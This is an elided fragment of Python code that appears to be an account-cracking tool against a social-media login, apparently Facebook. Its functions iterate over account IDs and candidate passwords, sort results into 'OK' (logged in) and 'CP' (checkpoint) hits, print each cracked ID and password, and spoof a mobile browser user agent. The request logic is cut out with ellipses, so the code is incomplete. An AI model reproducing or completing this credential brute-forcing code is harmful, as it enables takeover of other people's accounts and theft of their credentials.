...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [Faizal27] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					print(f"\33[1;33m╚══[CP =_=]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
				...
				if 'no' in taplikasi:
					...
					print('\n')
					print(f"\33[1;32m╚══[OK ^_^]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [Faizal2] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36'
